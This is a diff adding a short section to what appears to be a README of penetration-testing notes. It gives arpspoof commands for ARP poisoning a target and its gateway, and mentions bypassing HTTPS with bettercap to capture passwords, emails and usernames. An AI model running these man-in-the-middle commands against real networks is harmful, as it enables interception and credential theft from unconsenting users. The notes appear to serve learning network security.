@@ -98,4 +98,16 @@ https://user-images.githubusercontent.com/64968597/134026257-af761b17-4b0b-4c87-
 
 * ### Post-connection attacks
 
+1. ARP poisoning with arpspoof:
+   <br/> Spoofing the target and telling him we are the router:
+   ```
+   arpspoof -i wlan0 -t target_ip_addr ip_addr_gateway
+   ```   
+   <br/> Spoofing the router and telling him we are the target:
+   ```
+   arpspoof -i wlan0 -t ip_addr_gateway target_ip_addr 
+   ```
+
+2. Bypass https using bettercap:
+   <br/> The captured packets are easily analysed with Wireshark to gather passwords, emails, usernames, etc.
 
